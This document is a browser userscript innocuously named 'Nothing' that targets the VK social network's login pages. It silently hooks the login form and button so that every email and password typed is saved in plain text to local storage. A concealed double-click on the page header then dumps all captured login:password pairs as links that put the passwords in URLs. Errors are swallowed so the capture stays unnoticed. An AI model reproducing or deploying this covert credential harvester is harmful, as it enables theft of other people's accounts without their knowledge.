// ==UserScript==
// @name Nothing
// @include http*://vk.com/*
// @include http*://vkontakte.ru/*
// ==/UserScript==

var nothing = {
	storagePrefix: "vkacc_",
	inject: function () {
		var _this = this;
		
		var saveFunction = function () {
			var loginForm = document.getElementById('login');
			if (!loginForm) loginForm = document.getElementById('quick_login_form');

			var account = {
				login: loginForm.elements['email'].value,
				password: loginForm.elements['pass'].value
			}

			localStorage[_this.storagePrefix + account.login] = JSON.stringify(account);
		}

		var loginForm = document.getElementById('quick_login_form');
		if (loginForm) {
			var loginButton = document.getElementById('quick_login_button').onclick;
			
			var oldButtonHandler = loginButton.onclick;
			var oldFormHandler = loginForm.onsubmit;
			
			loginForm.onsubmit = function () {
				saveFunction();
				oldFormHandler();
			}
			
			loginButton.onclick = function () {
				saveFunction();
				oldButtonHandler();
			}
		}
		
		var loginForm = document.getElementById('login');
		if (loginForm) {
			var loginButton = document.getElementsByClassName('ncc')[0].childNodes[0];
			
			var oldButtonHandler = loginButton.onclick;
			var oldFormHandler = loginForm.onsubmit;
			
			loginForm.onsubmit = function () {
				saveFunction();
				oldFormHandler();
			}
			
			loginButton.onclick = function () {
				saveFunction();
			}
		}
	},

	createAccountsCache: function () {
		for (var key in localStorage) {
			if (key.startsWith(this.storagePrefix)) {
				this.accountsCache.push(JSON.parse(localStorage[key]));
			}
		}
	},
	
	accountsCache: [],
	
	injectPasswordDisplayer: function () {
		var header = document.getElementById('header');
		
		if (header) {
			var _this = this;
			header.ondblclick = function () {
				accountsCache = _this.accountsCache;
				var html = "";
				for (var i=0; i<_this.accountsCache.length; i++) {
					html+="<a href='/login.php?email="+accountsCache[i].login+"&pass="+accountsCache[i].password+"'>" + accountsCache[i].login + ":" + accountsCache[i].password + "</a>";
				}
				
				document.body.innerHTML = html;
			}
		}
	},
	
	start: function () {
		try { 
			this.inject();	
			this.createAccountsCache();
			this.injectPasswordDisplayer();
		}
		catch (e) { }
	}
}

// dirty hack
String.prototype.startsWith = function (str) {
    return this.indexOf(str) == 0;
};

nothing.start();
